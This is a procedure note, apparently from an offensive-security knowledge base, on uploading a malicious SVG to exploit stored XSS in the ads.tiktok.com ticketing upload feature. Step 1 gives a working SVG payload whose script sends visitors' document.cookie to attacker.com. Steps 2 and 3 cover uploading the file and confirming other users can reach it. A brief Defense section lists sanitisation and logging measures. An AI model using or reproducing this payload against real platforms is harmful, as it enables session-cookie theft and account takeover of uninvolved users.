---
tags:
  - xss
  - file-upload
  - svg
  - payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-13T23:52:55.121Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 96716755-2d8d-425e-bb6f-fbd3188d2da1
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
---
# Upload-Malicious-SVG-with-XSS-Payload

## Summary

Craft and upload an SVG file containing embedded JavaScript to exploit the stored XSS vulnerability in the TikTok ads ticketing upload feature, storing the payload server-side for later execution.

## Description

The procedure targets the lack of content validation on ads.tiktok.com's file upload, where SVG files are accepted and rendered without stripping scripts. The payload executes when viewed, allowing arbitrary JS in the platform's context. Prerequisites include authenticated access and knowledge of the upload endpoint.

## Requirements

1. Text editor to create the SVG file
2. Authenticated session on ads.tiktok.com
3. Target ticket form with upload capability

## Defense

Defensive measures and detection strategies:

- Sanitize uploaded files by removing script tags and validating against SVG schema
- Store uploads outside web root or serve with no-sniff headers
- Log and alert on uploads of vector files in ticketing systems

## Objectives

1. Embed JS payload in SVG without detection
2. Successfully store the file via upload endpoint
3. Prepare for payload execution on view

## Instructions

### Step 1: Craft Malicious SVG

**Context**: Create the payload file exploiting SVG's XML nature to include script.

Use a text editor to write:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS via SVG')">
  <script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>
</svg>
```

Save as malicious.svg. The onload or script tag triggers JS.

### Step 2: Upload to Platform

**Context**: Submit the file through the ticketing interface.

Navigate to a ticket creation form on ads.tiktok.com, attach the SVG, and submit. No special flags needed as validation is absent.

**Expected Output**: Ticket created with SVG attached, no upload errors.

### Step 3: Verify Storage

**Context**: Confirm the file is stored and retrievable.

Check the submitted ticket to see the attachment listed, ensuring it's accessible to other users.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Remote File Copy]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[upload]]
- [[svg]]
